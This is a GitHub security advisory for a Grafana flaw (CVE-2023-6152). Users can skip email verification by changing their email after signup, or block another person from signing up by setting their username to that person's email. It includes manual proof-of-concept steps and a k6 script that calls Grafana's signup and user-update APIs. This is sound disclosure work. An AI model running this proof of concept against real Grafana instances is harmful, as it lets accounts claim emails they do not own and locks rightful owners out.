# [M] Email Validation Bypass And Preventing Sign Up From Email's Owner

## Summary
Severity: Medium
Advisory: GHSA-3hv4-r2fm-h27f
CVE: CVE-2023-6152
CWE: CWE-863
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L (CVSS_V3)
Published: 2024-02-13
Source: https://github.com/advisories/GHSA-3hv4-r2fm-h27f
Type: github-advisory

## Affected
- Go: `github.com/grafana/grafana` — affected >=2.5.0 <9.5.16
- Go: `github.com/grafana/grafana` — affected >=10.0.0 <10.0.11
- Go: `github.com/grafana/grafana` — affected >=10.1.0 <10.1.7
- Go: `github.com/grafana/grafana` — affected >=10.2.0 <10.2.4
- Go: `github.com/grafana/grafana` — affected >=10.3.0 <10.3.3

## Details
### Summary
Email validation can easily be bypassed because `verify_email_enabled` option enable email validation at sign up only.
A user changing it's email after signing up (and verifying it) can change it without verification in `/profile`.
This can be used to prevent legitimate owner of the email address from signing up.

Another way to prevent email's owner from signing up is by setting Username as an email:
When a new user is registrering, they can set two different email addresses in the Email and Username field, technically having 2 email addresses (because Grafana handles usernames and emails the same in some situations), but only the former is validated.

![](https://user-images.githubusercontent.com/44581623/282073913-c1a8c20b-b6c3-46eb-840c-9e0dae718a2a.png)

Here user a prevents owner of bar@example.com to signup.

### Details
I don't know exact location but this is related to PUT /api/user handler.

### PoC
Bypass email validation:
* Start a new grafana instance using latest version
* Sign up with email foo@example.
* Login to that account.
* Go to profile and change email to  bar@example.com
* That's it, your using an email you don't own.

Prevent email's owner from signing up:
* Start a new grafana instance using latest version
* Sign up with email foo@example.
* Login to that account.
* Go to profile and change username (not email) to [bar@example.com](mailto:bar@example.com)
* Signout.
* Try to sign up with email [b@example.com](mailto:b@example.com)
* Warning popup "User with same email address already exists"

K6 script (with `verify_email_enabled` set to `false`):
```js
import { check, group } from "k6"
import http from "k6/http"

export const options = {
  scenarios: {
    perVuIter: {
      executor: 'per-vu-iterations',
      vus: 1,
      iterations: 1
    }
  }
}

const GRAFANA_URL = __ENV.GRAFANA_URL || "http://localhost:3000"

export default function () {
  group("create user_a with email foo@example.com", () => {
    const response = http.post(`${GRAFANA_URL}/api/user/signup/step2`, JSON.stringify({
      "email": "foo@example.com",
      "password": "password"
    }), {
      headers: {
        'Content-Type': "application/json"
      }
    })

    check(response, {
      'status code is 200': (r) => r.status == 200
    })
  })

  group("change user_a login to bar@example.com", () => {
    const response = http.put(`${GRAFANA_URL}/api/user`, JSON.stringify({
      "email": "foo@example.com",
      "login": "bar@example.com", // user_b email.
    }), {
      headers: {
        'Content-Type': "application/json"
      }
    })

    check(response, {
      'status code is 200': (r) => r.status == 200
    })
  })

  http.cookieJar().clear(GRAFANA_URL)

  group("create user_b with email bar@example.com", () => {
    const response = http.post(`${GRAFANA_URL}/api/user/signup/step2`, JSON.stringify({
      "email": "bar@example.com",
      "username": "bar@example.com",
      "password": "password"
    }), {
      headers: {
        'Content-Type': "application/json"
      }
    })

    check(response, {
      'status code is 200': (r) => r.status == 200 // fail
    })
  })
}
```

### Impact
Bypass email verification.
Prevent legitimate owner from signing up.

## References
- https://github.com/grafana/bugbounty/security/advisories/GHSA-3hv4-r2fm-h27f
- https://nvd.nist.gov/vuln/detail/CVE-2023-6152
- https://github.com/grafana/grafana
- https://grafana.com/security/security-advisories/cve-2023-6152
- https://security.netapp.com/advisory/ntap-20250214-0008
